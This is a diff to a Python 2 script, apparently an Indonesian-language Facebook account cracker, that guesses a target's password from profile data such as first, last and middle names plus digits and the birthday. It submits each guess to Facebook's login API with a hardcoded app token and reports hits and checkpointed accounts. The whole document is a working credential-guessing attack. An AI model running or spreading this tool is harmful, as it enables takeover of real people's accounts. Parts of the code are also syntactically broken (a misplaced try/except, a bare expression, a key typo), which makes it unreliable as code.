@@ -53,6 +53,7 @@ def brute():
         iqbal = requests.get("https://graph.facebook.com/" + target + "?access_token=" + token)
         jsl = json.loads(iqbal.text)
         sandi1 = jsl["first_name"] + "123"
+        print sandi1
         log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
         js = json.load(log)
         if "access_token" in js:
@@ -63,6 +64,7 @@ def brute():
         
         else:
             sandi2 = jsl["first_name"] + "12345" 
+            print sandi2
             log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
             js = json.load(log)
             if "access_token" in js:
@@ -71,6 +73,7 @@ def brute():
                 print " Akun Cekpoint" + sandi2
             else:
                 sandi3 = jsl["first_name"] + "321" 
+                print sandi3
                 log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                 js = json.load(log)
                 if "access_token" in js:
@@ -79,6 +82,7 @@ def brute():
                     print " Akun Cekpoint" + sandi3
                 else:
                     sandi4 = jsl["first_name"] + "54321" 
+                    print sandi4
                     log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")                   
                     js = json.load(log)
                     if "access_token" in js:
@@ -87,6 +91,7 @@ def brute():
                         print " Akun Kena Cekpoint: " + sandi4
                     else:
                         sandi5 = jsl["last_name"] + "123"
+                        print sandi5
                         log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                         js = json.load(log)
                         if "access_token" in js:
@@ -94,16 +99,22 @@ def brute():
                         elif "www.facebook.com" in js["error_msg"]:
                             print " Akun Kena cekpoint: " + sandi5
                         else:
+
                             tgl = jsl["birthday"]
                             sandi6 = tgl.replace("/", "")
+                            print sandi6
                             log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                             js = json.load(log)
-                            if "access_token" in js:
-                                print " Found: " + sandi6
-                            elif "www.facebook.com" in js["error_msg"]:
-                                print " Akun Kena Cekpoint: " + sandi6
+                            try:
+                                if "access_token" in js:
+                                    print " Found: " + sandi6
+                                elif "www.facebook.com" in js["error_msg"]:
+                                    print " Akun Kena Cekpoint: " + sandi6
+                            except KeyError:
+                                print "Tidak Ada Birthday"
                             else:
                                 sandi7 = jsl["last_name"] + "12345"
+                                print sandi7
                                 log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                 js = json.load(log)
                                 if "access_token" in js:
@@ -112,15 +123,43 @@ def brute():
                                     print " Akun Kena Cekpoint."
                                 else:
                                     sandi8 = jsl["first_name"] + jsl["last_name"]
+                                    sandi8
                                     log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi8 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                     js = json.load(log)
                                     if "access_token" in js:
                                         print " Found: " + sandi8
-                                    else "www.facebook.com" in js["error_msg"]:
+                                    elif "www.facebook.com" in js["error_msg"]:
                                         print " Akun Kena Cekpoint" + sandi8
                                     else:
-                                        print " Zoonkkkk......"
-                                        
+                                        sandi9 = jsl["firs_name"] + jsl["middle_name"]
+                                        print sandi9
+
+                                        log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi9 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+                                        js = json.load(log)
+                                        if "access_token" in js:
+                                            print " Found: " + sandi9
+                                        elif "www.facebook.com" in js["error_msg"]:
+                                            print " Akun Kena Cekpoint." + sandi9
+                                        else:
+                                            sandi10 = jsl["middle_name"] + jsl["first_name"]
+                                            print sandi10
+                                            log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi10 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+                                            js = json.load(log)
+                                            if "access_token" in js:
+                                                print " Found: " + sandi10
+                                            elif "www.facebook.com" in js["error_msg"]:
+                                                print " Akun Kena Cekpoint." + sandi10
+                                            else:
+                                                sandi11 = "sayang"
+                                                print sandi11
+                                                log = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + target + "&locale=en_US&password=" + sandi11 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+                                                js = json.load(log)
+                                                if "access_token" in js:
+                                                    print " Found: " + sandi11
+                                                elif "www.facebook.com" in js["error_msg"]:
+                                                    print " Akun Kena Cekpoint." + sandi11
+                                                else:
+                                                    print " Zoonkkkk..."
 
 
 
